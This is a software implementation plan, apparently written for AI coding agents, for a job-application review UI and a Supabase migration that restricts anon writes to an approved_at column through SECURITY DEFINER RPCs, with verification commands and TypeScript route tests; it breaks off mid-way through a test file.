# Beelink M2 — Applications Review UI Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close all 15 documented UI gaps (U1-U15) in `contact-manager/src/components/ApplicationsPage.tsx` so a human can review a job posting, resume/cover letter, and generated application-form preview, edit any wrong screening/eligibility answer, and approve a real submission with one confirmed tap and visible status feedback — while a new `agent_runs`-backed health strip and attention badge replace the GitHub Actions red-X signal M2 is preparing to retire in later milestones.

**Architecture:** A new `ApplicationDetailSheet.tsx` (built on the existing `Sheet`/Vaul primitive) becomes the single place a human reviews a job + resume + apply-preview before approving; `ApplicationsPage.tsx` gains filters, new columns, and a `ConfirmModal`-gated approve flow with polling; a `SystemHealthStrip.tsx` surfaces the last run per `agent_runs.source`. On the data side, `approved_at` becomes a column only a new `SECURITY DEFINER` Postgres RPC can write (the anon key's table-level UPDATE grant is narrowed to exclude it), and `cu_linkedin.py` gains a real `status='blocked'` signal for CAPTCHA stops instead of silently reporting `success`.

**Tech Stack:** Next.js 16 App Router, React 19, TypeScript strict, Tailwind v4, `@supabase/supabase-js` (anon key only), Vaul (`Sheet`), Radix (`Select`, `Dialog` via `ConfirmModal`), Vitest + Testing Library, Playwright; Python 3.11, `pytest` + `pytest-mock`, `supabase-py`.

**Spec:** `docs/superpowers/specs/2026-09-17-beelink-24-7-automation-design.md` — specifically the "UI changes needed" and "Data model changes" sections. Two corrections to that document, both verified live against the production Supabase project (`yqrnsparrvirruwjsjgt`, linked) before this plan was written:
1. The spec's premise that `ConfirmModal` is "already-unused" is wrong. It is already imported and used in `Nav.tsx`, `ContactsList.tsx`, and `LabRoot.tsx`. This plan reuses it, never reinvents it.
2. The spec's "Approval-signal security" section describes enabling RLS on `job_applications`. That approach was superseded by an explicit, final, user-confirmed decision (recorded below in Global Constraints and implemented in Task 1): **no RLS anywhere**, a table-level `REVOKE`/`GRANT` column allowlist instead. Follow the Global Constraints below, not the spec's RLS paragraph, wherever the two disagree.

## Global Constraints

- No service-role Supabase key anywhere in this repo — every reader and writer (Python `db.py` and every Next.js API route) uses the anon key (`NEXT_PUBLIC_SUPABASE_ANON_KEY` / `SUPABASE_ANON_KEY`).
- No RLS on any table, including `job_applications`. This is a final, explicit decision (not an oversight): enabling RLS on a table written by four different Python scripts (`job_pick.py`, `apply_agent.py`, `cu_linkedin.py`, `resume_agent.py`) plus three Next.js routes, all through the one shared anon key, risks silently breaking one of them for a security property that concerns exactly one column.
- The anon key is shared by every Python script and every Next.js API route — there is no second, more-privileged credential to reach for.
- `approved_at` can only ever be set via the `approve_application(p_id BIGINT)` Postgres RPC (`SECURITY DEFINER`), never a direct column write, and can only ever be cleared via the companion `reset_approval(p_id BIGINT)` RPC (also `SECURITY DEFINER`, guarded to a still-`ready_to_submit` row so it can never un-approve an already-submitted one — see Task 1). The anon role's table-level `UPDATE` **and `INSERT`** on `job_applications` are revoked and re-granted on a column list (derived dynamically from the live schema, not hand-enumerated) that excludes `approved_at` (verified live: Supabase's bootstrap grants `anon` blanket table-level `UPDATE`/`INSERT`, so a column-level `REVOKE` alone would be a silent no-op — see Task 1).
- `ConfirmModal` (`contact-manager/src/components/ui/ConfirmModal.tsx`) must be reused exactly as it exists today, never reinvented. Its props are fixed: `open`, `title`, `body`, `confirmLabel`, `confirmVariant?`, `onConfirm`, `onCancel`, `loading?`.
- No new npm dependency for PDF viewing — render `resume_file_ref`/`cover_letter_file_ref` signed URLs in a plain `<iframe>`. Browsers render PDFs natively in an iframe.
- Every code change ships with tests in the same task that makes the change (this repo's `contact-manager/CLAUDE.md` and root `CLAUDE.md` both require zero tolerance for failing tests before commit/push).
- `job_applications.id` is `BIGSERIAL` (`BIGINT`), not `UUID` and not plain `INT` — every SQL signature and every `Number(id)` JS conversion in this plan matches that.
- Migrations are applied to the linked remote project via `supabase db push` (this repo's established workflow — see `docs/python/db-schema.md`), never assumed to auto-apply from a commit.

---

### Task 1: `approved_at` column + `approve_application` RPC (U4/U5 data layer)

**Files:**
- Create: `supabase/migrations/20260925000000_add_approved_at_and_approve_application_rpc.sql`

**Interfaces:**
- Produces: `job_applications.approved_at TIMESTAMPTZ NULL` column; a Postgres function `approve_application(p_id BIGINT) RETURNS void`, callable via `supabase.rpc("approve_application", { p_id: <number> })` from any anon-keyed Supabase JS client. Raises (surfaces as `{ error }` on the JS client, not a thrown exception — see Task 2) when the target row is not `stage='ready_to_submit'` with a non-null `apply_preview` and a null `approved_at`. Also produces a companion function `reset_approval(p_id BIGINT) RETURNS void`, callable the same way, that clears `approved_at` back to `NULL` — guarded to only fire on a row still `stage='ready_to_submit'` with a non-null `approved_at`, so it can never un-approve an already-submitted row. Task 2's submit route calls it when the GitHub dispatch fails after approval, so a failed dispatch never permanently bricks a row (see Task 2).
- Consumes: nothing from earlier tasks (this is the first task).

This table has no unit-testable code path (it's pure SQL/DDL) — this repo's own convention, per `docs/superpowers/specs/2026-09-17-beelink-24-7-automation-design.md`'s Testing Strategy section, is that SQL migrations are verified manually rather than via a test runner. Every verification step below is a real, runnable `supabase db query` command against the linked project — treat these exactly like the "run test, verify it fails / passes" steps in every other task.

- [ ] **Step 1: Confirm the anon role's current grants (baseline, before any change)**

Run:
```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && supabase db query "SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE table_name = 'job_applications' AND grantee = 'anon' ORDER BY privilege_type;" --linked
```
Expected: a row with `privilege_type = "UPDATE"` at table level (confirmed live 2026-09-24 — `anon` holds table-level `UPDATE` via Supabase's bootstrap `GRANT ALL ON ALL TABLES IN SCHEMA public TO anon, authenticated, service_role`). This is why a column-level `REVOKE UPDATE (approved_at) ... FROM anon` alone would NOT work — Postgres does not let a column-level revoke carve an exception out of a table-level grant. The migration below revokes the table-level grant entirely and re-grants an explicit column list.

- [ ] **Step 2: Write the migration file**

```sql
-- M2: approved_at is the third leg of the ARMED-gate design (see
-- docs/superpowers/specs/2026-09-17-beelink-24-7-automation-design.md, "The ARMED gate on a
-- persistent host"). approve_application() is the ONLY way it can ever be set -- this migration
-- makes that true at the database layer. IMPORTANT: this migration alone does NOT yet gate
-- apply_agent.py's submit() on approved_at -- that runtime enforcement (requiring
-- job.get("approved_at") truthy before ever clicking Submit) lands in Task 6. Until Task 6
-- lands, approved_at is set-only: nothing reads it yet, and the manual workflow_dispatch path
-- to apply_agent_submit.yml remains an open bypass of the intended three-condition gate.
--
-- This migration deliberately does NOT enable RLS (see root plan's Global Constraints --
-- this repo authenticates every reader/writer, Python and Next.js alike, with one shared
-- anon key, and RLS on a table four different Python scripts and three API routes all write
-- through would risk silently breaking one of them for a property that concerns one column).
--
-- Confirmed live against the production project before writing this migration: the anon role
-- already holds blanket TABLE-LEVEL UPDATE and INSERT grants on job_applications (Supabase's
-- own bootstrap: GRANT ALL ON ALL TABLES IN SCHEMA public TO anon, authenticated, service_role).
-- A column-level REVOKE does NOT carve an exception out of a table-level grant in Postgres --
-- it only removes a column-level grant, so a naive "REVOKE UPDATE (approved_at) ... FROM anon"
-- would be a silent no-op and leave approved_at fully anon-writable. The real fix: revoke the
-- table-level UPDATE *and* INSERT entirely (INSERT too, not just UPDATE -- an anon INSERT can
-- otherwise preset approved_at on a brand-new row, forging an approval the moment Task 6 makes
-- approved_at actually load-bearing), then re-grant both privileges on every column EXCEPT
-- approved_at. The column list is derived dynamically from information_schema at migration
-- time below, not hand-enumerated, so it can never silently drift from the live schema (a
-- hand-typed list is exactly the kind of thing that goes stale the first time someone adds a
-- column and forgets this file exists). This is zero blast radius for every existing caller
-- (job_pick.py, apply_agent.py, cu_linkedin.py, resume_agent.py, and the PATCH/POST routes in
-- contact-manager) since every column any of them writes today stays in the re-grant list.
--
-- Deliberate, documented scope limit: this allowlist necessarily keeps `stage` anon-writable
-- (every Python writer needs it) even though the spec's original ask was to deny anon writes to
-- both approved_at and stage. approved_at is the property that actually needs protecting (it's
-- the ARMED gate); stage is a shared, heavily-written column with no single owner. See this
-- plan's "Judgment calls and deviations" section.
--
-- IMPORTANT for future schema changes: a new column added to job_applications needs no manual
-- edit here (the grant is derived live) -- but a future migration that ALSO touches
-- UPDATE/INSERT grants on this table must run AFTER this one, or it will re-grant a blanket
-- privilege and reopen the hole. See docs/python/db-schema.md.
--
-- Rollback: GRANT UPDATE, INSERT ON job_applications TO anon; (re-opens approved_at to the
-- anon key wholesale -- only use this to fully back out of the ARMED gate's column-level
-- protection, never as a partial fix.)

ALTER TABLE job_applications ADD COLUMN IF NOT EXISTS approved_at TIMESTAMPTZ NULL;

DO $$
DECLARE cols text;
BEGIN
  SELECT string_agg(quote_ident(column_name), ', ') INTO cols
  FROM information_schema.columns
  WHERE table_schema = 'public' AND table_name = 'job_applications' AND column_name <> 'approved_at';

  EXECUTE 'REVOKE UPDATE ON job_applications FROM anon';
  EXECUTE format('GRANT UPDATE (%s) ON job_applications TO anon', cols);

  EXECUTE 'REVOKE INSERT ON job_applications FROM anon';
  EXECUTE format('GRANT INSERT (%s) ON job_applications TO anon', cols);
END $$;

CREATE OR REPLACE FUNCTION approve_application(p_id BIGINT)
RETURNS void
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public, pg_temp
AS $$
BEGIN
  UPDATE job_applications
  SET approved_at = now()
  WHERE id = p_id
    AND stage = 'ready_to_submit'
    AND apply_preview IS NOT NULL
    AND approved_at IS NULL;

  IF NOT FOUND THEN
    RAISE EXCEPTION 'approve_application: row % is not in an approvable state (already approved, not ready_to_submit, or missing a preview)', p_id;
  END IF;
END;
$$;

-- Companion to approve_application: if a GitHub Actions dispatch fails after approval (502,
-- token expiry, outage), approved_at is already set and every retry would 409 forever, with no
-- role able to clear it (approved_at is excluded from anon's UPDATE grant above). Guarded so it
-- can NEVER un-approve an already-submitted row: only fires when the row is still
-- stage = 'ready_to_submit' (a submitted row has moved on to stage = 'applied') and is
-- currently approved.
CREATE OR REPLACE FUNCTION reset_approval(p_id BIGINT)
RETURNS void
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public, pg_temp
AS $$
BEGIN
  UPDATE job_applications
  SET approved_at = NULL
  WHERE id = p_id
    AND stage = 'ready_to_submit'
    AND approved_at IS NOT NULL;

  IF NOT FOUND THEN
    RAISE EXCEPTION 'reset_approval: row % is not in a resettable state (not ready_to_submit or not currently approved)', p_id;
  END IF;
END;
$$;

-- Postgres GRANTs EXECUTE to PUBLIC by default on function creation -- without these REVOKEs,
-- the GRANTs to anon below are no-ops that leave every role able to call these functions.
REVOKE EXECUTE ON FUNCTION approve_application(BIGINT) FROM PUBLIC;
GRANT  EXECUTE ON FUNCTION approve_application(BIGINT) TO anon;

REVOKE EXECUTE ON FUNCTION reset_approval(BIGINT) FROM PUBLIC;
GRANT  EXECUTE ON FUNCTION reset_approval(BIGINT) TO anon;
```

- [ ] **Step 3: Apply the migration**

Run:
```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && supabase db push --linked
```
Expected: the CLI reports the new migration applied with no errors.

- [ ] **Step 4: Verify the column exists**

Run:
```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && supabase db query "SELECT column_name, data_type, is_nullable FROM information_schema.columns WHERE table_name='job_applications' AND column_name='approved_at';" --linked
```
Expected: one row, `data_type = "timestamp with time zone"`, `is_nullable = "YES"`.

- [ ] **Step 5: Verify the anon UPDATE grant no longer covers `approved_at` but still covers everything else (I1 -- derived dynamically, not hand-recounted)**

Run:
```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && supabase db query "SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE table_name = 'job_applications' AND grantee = 'anon' AND privilege_type = 'UPDATE';" --linked
```
Expected: **zero rows** (the table-level grant is gone; only the column-level grant remains, which `role_table_grants` does not surface).

Run:
```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && supabase db query "SELECT column_name FROM information_schema.column_privileges WHERE table_name='job_applications' AND grantee='anon' AND privilege_type='UPDATE' ORDER BY column_name;" --linked
```
Expected: one row per column in `job_applications` except `approved_at` (confirmed live at the time this plan was written to be 27 rows — but that exact number is not load-bearing, since the migration derives the list from the live schema rather than a hand-typed one), and explicitly **no** `approved_at` row.

- [ ] **Step 5b: Verify the anon INSERT grant also excludes `approved_at` (I2 -- closes the forged-approval-via-INSERT gap: without this, `POST /rest/v1/job_applications` could preset `approved_at` on a brand-new row)**

Run:
```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && supabase db query "SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE table_name = 'job_applications' AND grantee = 'anon' AND privilege_type = 'INSERT';" --linked
```
Expected: **zero rows** (the table-level INSERT grant is gone too).

Run:
```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && supabase db query "SELECT column_name FROM information_schema.column_privileges WHERE table_name='job_applications' AND grantee='anon' AND privilege_type='INSERT' ORDER BY column_name;" --linked
```
Expected: the same column set as Step 5's UPDATE list, explicitly **no** `approved_at` row.

- [ ] **Step 6: Verify the RPC guard behavior end-to-end, including the `reset_approval` recovery path (C3/M1 -- everything below runs inside one transaction that ends with a deliberate `RAISE EXCEPTION`, so nothing here is ever persisted; no disposable test rows to remember to clean up, and no risk of an interrupted step sequence leaving rows visible in `/applications`)**

This command is DESIGNED to always exit with a nonzero/error status — that is how the
transaction discards both test rows. Do not stop at the first `ERROR:` line; read which error it
is.

Run:
```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && supabase db query "
DO \$\$
DECLARE
  test_id BIGINT;
  test_id_2 BIGINT;
BEGIN
  INSERT INTO job_applications (company, role, job_url, stage, apply_preview)
  VALUES ('M2 Test Co', 'Test Role', 'https://example.com/m2-test-' || floor(random()*1000000)::text,
          'ready_to_submit', '{\"platform\":\"test\",\"field_values\":{},\"eligibility_answers\":{},\"screening_answers\":{}}'::jsonb)
  RETURNING id INTO test_id;

  PERFORM approve_application(test_id);

  BEGIN
    PERFORM approve_application(test_id);
    RAISE EXCEPTION 'expected approve_application to reject an already-approved row';
  EXCEPTION WHEN OTHERS THEN
    IF SQLERRM NOT ILIKE '%not in an approvable state%' THEN
      RAISE EXCEPTION 'unexpected error on re-approve: %', SQLERRM;
    END IF;
  END;

  PERFORM reset_approval(test_id);
  IF (SELECT approved_at FROM job_applications WHERE id = test_id) IS NOT NULL THEN
    RAISE EXCEPTION 'reset_approval did not clear approved_at';
  END IF;

  PERFORM approve_application(test_id);

  INSERT INTO job_applications (company, role, job_url, stage)
  VALUES ('M2 Test Co 2', 'Test Role 2', 'https://example.com/m2-test2-' || floor(random()*1000000)::text, 'saved')
  RETURNING id INTO test_id_2;

  BEGIN
    PERFORM approve_application(test_id_2);
    RAISE EXCEPTION 'expected approve_application to reject a row that was never previewed';
  EXCEPTION WHEN OTHERS THEN
    IF SQLERRM NOT ILIKE '%not in an approvable state%' THEN
      RAISE EXCEPTION 'unexpected error on unready row: %', SQLERRM;
    END IF;
  END;

  RAISE EXCEPTION 'M2 Test rollback -- all assertions above passed, rolling back test rows';
END \$\$;
" --linked
```
Expected: the ONLY acceptable output is a final error whose message is exactly `M2 Test
rollback -- all assertions above passed, rolling back test rows`. Any other error text
(`unexpected error on re-approve: ...`, `expected approve_application to reject ...`,
`reset_approval did not clear approved_at`, or anything else) means an assertion failed —
investigate before proceeding; do not treat "it errored" alone as success.

Confirm no test rows persisted either way:
```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && supabase db query "SELECT count(*) FROM job_applications WHERE company IN ('M2 Test Co', 'M2 Test Co 2');" --linked
```
Expected: `0`.

- [ ] **Step 6b: Verify the real anon-key path through PostgREST (C7 — Step 6 above runs as the `postgres` superuser via the CLI, NOT as `anon` through PostgREST, so it proves the guard logic but nothing about whether `anon` actually holds `EXECUTE`, or whether PostgREST's schema cache has reloaded to expose the RPCs at all. This step is the one that actually validates what the frontend will experience; keep Step 6 too since it's still a useful cheap check of the guard logic, but Step 6b is the one that matters for "is this safe to ship.")**

Unlike Step 6, this needs a row that actually persists across separate HTTP requests (each curl
is its own connection), so insert one for real and clean it up at the end:

```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && supabase db query "
INSERT INTO job_applications (company, role, job_url, stage, apply_preview)
VALUES ('M2 Curl Test Co', 'Test Role', 'https://example.com/m2-curl-test-' || floor(random()*1000000)::text,
        'ready_to_submit', '{\"platform\":\"test\",\"field_values\":{},\"eligibility_answers\":{},\"screening_answers\":{}}'::jsonb)
RETURNING id;
" --linked
```
Note the returned `id` (call it `<TEST_ID>`), then:
```bash
curl -s -X POST "$NEXT_PUBLIC_SUPABASE_URL/rest/v1/rpc/approve_application" \
  -H "apikey: $NEXT_PUBLIC_SUPABASE_ANON_KEY" \
  -H "Authorization: Bearer $NEXT_PUBLIC_SUPABASE_ANON_KEY" \
  -H "Content-Type: application/json" -d '{"p_id": <TEST_ID>}' -w '\n%{http_code}\n'
```
Expected: `204` (first call against the fresh test row).

Run the exact same curl again against the same `<TEST_ID>`:
Expected: a `P0001`-shaped error body containing `"not in an approvable state"` and a non-2xx
status code.

Run the equivalent curl against `reset_approval` with the same `<TEST_ID>`:
```bash
curl -s -X POST "$NEXT_PUBLIC_SUPABASE_URL/rest/v1/rpc/reset_approval" \
  -H "apikey: $NEXT_PUBLIC_SUPABASE_ANON_KEY" \
  -H "Authorization: Bearer $NEXT_PUBLIC_SUPABASE_ANON_KEY" \
  -H "Content-Type: application/json" -d '{"p_id": <TEST_ID>}' -w '\n%{http_code}\n'
```
Expected: `204` (the row is still `stage='ready_to_submit'` and was approved by the first call,
so it's resettable).

Then curl a direct `PATCH` against the same row's `approved_at` column, using the same anon
`apikey`/`Authorization` headers:
```bash
curl -s -X PATCH "$NEXT_PUBLIC_SUPABASE_URL/rest/v1/job_applications?id=eq.<TEST_ID>" \
  -H "apikey: $NEXT_PUBLIC_SUPABASE_ANON_KEY" \
  -H "Authorization: Bearer $NEXT_PUBLIC_SUPABASE_ANON_KEY" \
  -H "Content-Type: application/json" -d '{"approved_at": "2026-01-01T00:00:00Z"}' -w '\n%{http_code}\n'
```
Expected: a `42501` permission-denied-shaped error and a non-2xx status. This is the actual
discriminating proof that the column grant works for the anon KEY (not just `SET ROLE anon`
inside a CLI session, which is a different thing than what the frontend's anon-keyed client
actually does).

Clean up:
```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && supabase db query "DELETE FROM job_applications WHERE company = 'M2 Curl Test Co';" --linked
```
Expected: 1 row deleted.

- [ ] **Step 6c: Verify a direct anon INSERT cannot preset `approved_at` (I2)**

```bash
curl -s -X POST "$NEXT_PUBLIC_SUPABASE_URL/rest/v1/job_applications" \
  -H "apikey: $NEXT_PUBLIC_SUPABASE_ANON_KEY" \
  -H "Authorization: Bearer $NEXT_PUBLIC_SUPABASE_ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{"company": "M2 Insert Test Co", "role": "Test Role", "job_url": "https://example.com/m2-insert-test", "stage": "saved", "approved_at": "2026-01-01T00:00:00Z"}' \
  -w '\n%{http_code}\n'
```
Expected: a `42501` permission-denied-shaped error and a non-2xx status. Confirm no row was
created:
```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && supabase db query "SELECT count(*) FROM job_applications WHERE company = 'M2 Insert Test Co';" --linked
```
Expected: `0`. (If the INSERT somehow partially succeeded despite the error, clean up with
`DELETE FROM job_applications WHERE company = 'M2 Insert Test Co';`.)

- [ ] **Step 7: Verify a direct anon UPDATE on `approved_at` is now blocked (proves the column-level restriction, not just the RPC's own guard)**

Run:
```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && supabase db query "SET ROLE anon; UPDATE job_applications SET approved_at = now() WHERE false; RESET ROLE;" --linked
```
Expected: a `permission denied for column approved_at` (or equivalent) error, even though the `WHERE false` means no row would have matched — Postgres checks column privileges before evaluating `WHERE`.

Note (M2): if the `UPDATE` aborts the transaction, `RESET ROLE` never executes, which can leak
the `anon` role into whatever `supabase db query` runs next in the same session. Treat this
step as a secondary, cheap sanity check only — Step 6b's curl-based `PATCH` against the real
anon key is the primary proof and doesn't have this issue (each curl is its own connection).
This command's exact error text may also vary by Postgres version.

- [ ] **Step 7b: Document in `docs/python/db-schema.md` (M16)**

Add an entry for `job_applications.approved_at` (nullable, set only via `approve_application`,
cleared only via `reset_approval`), both new RPCs, and the column-allowlist rule this migration
establishes (any future migration touching `UPDATE`/`INSERT` grants on `job_applications` must
run after this one). This repo's root `CLAUDE.md` designates `docs/python/db-schema.md` as the
home for table schemas, new columns, and new `db.py` functions — keep it current in the same
task that lands the schema change, not as a follow-up.

- [ ] **Step 8: Commit**

```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && git add supabase/migrations/20260925000000_add_approved_at_and_approve_application_rpc.sql docs/python/db-schema.md && git commit -m "$(cat <<'EOF'
feat(db): add approved_at column + approve_application/reset_approval RPC gate

approved_at is the third leg of the ARMED submit gate. The anon key's
table-level UPDATE and INSERT on job_applications are revoked and
re-granted on a column allowlist (derived dynamically from the live
schema, never hand-enumerated) excluding approved_at -- verified live
that a column-level REVOKE alone is a no-op against Supabase's blanket
table-level grants, and that INSERT needed the same treatment as UPDATE
or an anon INSERT could preset approved_at on a new row. Both
SECURITY DEFINER RPCs harden search_path (public, pg_temp) and have
their default PUBLIC execute grant revoked before the anon grant, per
Postgres's own SECURITY DEFINER hardening guidance. reset_approval is a
companion to approve_application: if a GitHub dispatch fails after
approval (see Task 2), it clears approved_at back to NULL so the row
isn't permanently bricked -- guarded to a still-ready_to_submit row so
it can never un-approve an already-submitted one. No RLS -- a
deliberate, scoped decision documented in the M2 plan's Global
Constraints.

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_016LHvBT9KJnAoXtWu6UyBNH
EOF
)"
```

---

### Task 2: TS types, PATCH route fix (U10), `apply_preview` in PATCH (U11 backend), submit-route RPC gate (U4/U5 backend)

**Files:**
- Modify: `contact-manager/src/lib/types.ts`
- Modify: `contact-manager/src/app/api/applications/[id]/route.ts`
- Modify: `contact-manager/src/app/api/applications/[id]/submit/route.ts`
- Test: `contact-manager/src/app/api/applications/[id]/route.test.ts`
- Test: `contact-manager/src/app/api/applications/[id]/submit/route.test.ts`

**Interfaces:**
- Consumes: `approve_application` RPC from Task 1 (called as `supabase.rpc("approve_application", { p_id: number })`).
- Produces: `JobApplication` type gains `source_channel: string | null`, `resume_cost_usd: number | null`, `resume_tokens_input: number | null`, `resume_tokens_output: number | null`, `approved_at: string | null` — every later frontend task (3, 4, 5, 6, 7) reads these fields. `PATCH /api/applications/[id]` now accepts an optional `apply_preview` field (validated) alongside `stage`/`notes`. `POST /api/applications/[id]/submit` now returns `409` (with the RPC's error message) instead of dispatching when the row isn't approvable, and calls the `reset_approval` RPC (from Task 1) before returning `502` when the GitHub dispatch itself fails or throws, so a failed dispatch never leaves `approved_at` permanently set with no recovery path.

- [ ] **Step 1 (setup, no test): update the `JobApplication` type**

`contact-manager/src/lib/types.ts` — replace the existing `JobApplication` type (lines 274-294):

```ts
export type JobApplication = {
  id: string;
  contact_id: string | null;
  company: string;
  role: string;
  job_url: string | null;
  source: string | null;
  source_channel: string | null;
  stage: JobApplicationStage;
  applied_date: string | null;
  notes: string | null;
  posting_snapshot: Record<string, unknown> | null;
  resume_file_ref: string | null;
  cover_letter_file_ref: string | null;
  resume_cost_usd: number | null;
  resume_tokens_input: number | null;
  resume_tokens_output: number | null;
  pick_verdict: JobApplicationPickVerdict | null;
  pick_score: number | null;
  pick_reasoning: string | null;
  apply_preview: JobApplicationApplyPreview | null;
  apply_blocked_reason: string | null;
  approved_at: string | null;
  created_at: string;
  updated_at: string;
};
```

This is a type-only change with no runtime behavior of its own; it's verified indirectly by every subsequent step in this task (a route importing a field that doesn't exist on the type fails `npm run build`, not `npm test` — Step 8 below runs the full typecheck).

- [ ] **Step 2: Write the failing test for U10 (the `ready_to_submit` PATCH bug)**

`contact-manager/src/app/api/applications/[id]/route.test.ts` — add inside `describe("PATCH /api/applications/[id]", ...)`, after the existing `"updates stage"` test:

```ts
  it("accepts ready_to_submit as a valid stage (regression test for U10)", async () => {
    mockSingle.mockResolvedValue({ data: { id: "1", stage: "ready_to_submit" }, error: null });
    const req = new Request("http://test", {
      method: "PATCH",
      body: JSON.stringify({ stage: "ready_to_submit" }),
    });
    const res = await PATCH(req, params("1"));
    expect(res.status).toBe(200);
  });
```

- [ ] **Step 3: Run the test, verify it fails**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/app/api/applications/[id]/route.test.ts`
Expected: FAIL — `res.status` is `400`, because the route's local `JOB_APPLICATION_STAGES` array (lines 5-7) is missing `"ready_to_submit"`.

- [ ] **Step 4: Write the failing tests for U11 backend (`apply_preview` in PATCH)**

Same file, add a new `describe` block after the existing `PATCH` describe:

```ts
describe("PATCH /api/applications/[id] -- apply_preview (U11)", () => {
  const validPreview = {
    platform: "ashby",
    field_values: { name: "Kishore" },
    eligibility_answers: { "Authorized to work in the US?": "Yes" },
    screening_answers: { "Why this role?": "Because of the mission." },
  };

  it("updates apply_preview when given a valid object", async () => {
    mockSingle.mockResolvedValue({ data: { id: "1", apply_preview: validPreview }, error: null });
    const req = new Request("http://test", {
      method: "PATCH",
      body: JSON.stringify({ apply_preview: validPreview }),
    });
    const res = await PATCH(req, params("1"));
    expect(res.status).toBe(200);
    expect(mockUpdate).toHaveBeenCalledWith(expect.objectContaining({ apply_preview: validPreview }));
  });

  it("rejects apply_preview that isn't a well-formed object", async () => {
    const req = new Request("http://test", {
      method: "PATCH",
      body: JSON.stringify({ apply_preview: "nope" }),
    });
    const res = await PATCH(req, params("1"));
    expect(res.status).toBe(400);
    const body = await res.json();
    expect(body.error).toContain("apply_preview must be");
  });

  it("rejects apply_preview missing a required key", async () => {
    const req = new Request("http://test", {
      method: "PATCH",
      body: JSON.stringify({ apply_preview: { platform: "ashby" } }),
    });
    const res = await PATCH(req, params("1"));
    expect(res.status).toBe(400);
    const body = await res.json();
    expect(body.error).toContain("apply_preview must be");
  });
});
```

(I6: both rejection tests now assert the discriminating error message, not just the status code — `400` alone is not proof the `apply_preview` shape validation exists, since an unrecognized field also 400s today via the pre-existing `"no valid fields to update"` path.)

- [ ] **Step 5: Run the tests, verify they fail**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/app/api/applications/[id]/route.test.ts`
Expected: the U10 test fails as in Step 3. All three new U11 tests fail too, for one unambiguous reason each: `apply_preview` isn't a recognized field yet, so `updates` stays empty and every request in this `describe` block 400s with `"no valid fields to update"` instead of the intended behavior. The first test ("updates apply_preview...") expects `200` and gets `400`, so it fails on the status assertion. The other two expect `400` (which they already get, for the wrong reason) but now also assert `body.error` contains `"apply_preview must be"` — today's actual message is `"no valid fields to update"`, so both fail on the message assertion. No ambiguity: every failure in this step is on a specific, named assertion.

- [ ] **Step 6: Implement — rewrite `[id]/route.ts`**

```ts
export const runtime = "nodejs";

import { createClient } from "@supabase/supabase-js";
import {
  JOB_APPLICATION_STAGES,
  type JobApplicationStage,
  type JobApplicationApplyPreview,
} from "@/lib/types";

function getClient() {
  return createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
  );
}

function isValidApplyPreview(v: unknown): v is JobApplicationApplyPreview {
  if (typeof v !== "object" || v === null) return false;
  const p = v as Record<string, unknown>;
  return (
    typeof p.platform === "string" &&
    typeof p.field_values === "object" && p.field_values !== null &&
    typeof p.eligibility_answers === "object" && p.eligibility_answers !== null &&
    typeof p.screening_answers === "object" && p.screening_answers !== null
  );
}

export async function PATCH(req: Request, { params }: { params: Promise<{ id: string }> }) {
  const { id } = await params;

  let body: unknown;
  try {
    body = await req.json();
  } catch {
    return Response.json({ error: "Invalid JSON" }, { status: 400 });
  }

  if (typeof body !== "object" || body === null) {
    return Response.json({ error: "no valid fields to update" }, { status: 400 });
  }
  const b = body as Record<string, unknown>;
  const updates: Record<string, unknown> = {};

  if ("stage" in b) {
    if (!JOB_APPLICATION_STAGES.includes(b.stage as JobApplicationStage)) {
      return Response.json(
        { error: `stage must be one of: ${JOB_APPLICATION_STAGES.join(", ")}` },
        { status: 400 }
      );
    }
    updates.stage = b.stage;
  }
  if ("notes" in b && typeof b.notes === "string") {
    updates.notes = b.notes;
  }
  if ("apply_preview" in b) {
    if (!isValidApplyPreview(b.apply_preview)) {
      return Response.json(
        {
          error:
            "apply_preview must be an object with platform, field_values, eligibility_answers, screening_answers",
        },
        { status: 400 }
      );
    }
    updates.apply_preview = b.apply_preview;
  }

  if (Object.keys(updates).length === 0) {
    return Response.json({ error: "no valid fields to update" }, { status: 400 });
  }
  updates.updated_at = new Date().toISOString();

  try {
    const supabase = getClient();
    const { data, error } = await supabase
      .from("job_applications")
      .update(updates)
      .eq("id", Number(id))
      .select()
      .single();
    if (error) throw error;
    return Response.json({ application: data });
  } catch (err) {
    return Response.json({ error: String(err) }, { status: 500 });
  }
}
```

- [ ] **Step 7: Run the tests, verify they pass**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/app/api/applications/[id]/route.test.ts`
Expected: all tests PASS, including the original 5 tests (they must still pass unchanged).

- [ ] **Step 8: Write the failing tests for the submit-route RPC gate (U4/U5 backend)**

Rewrite `contact-manager/src/app/api/applications/[id]/submit/route.test.ts` in full (it needs a new `@supabase/supabase-js` mock the current file doesn't have):

```ts
import { describe, it, expect, vi, beforeEach } from "vitest";
import { POST } from "./route";

const mockRpc = vi.fn();
vi.mock("@supabase/supabase-js", () => ({
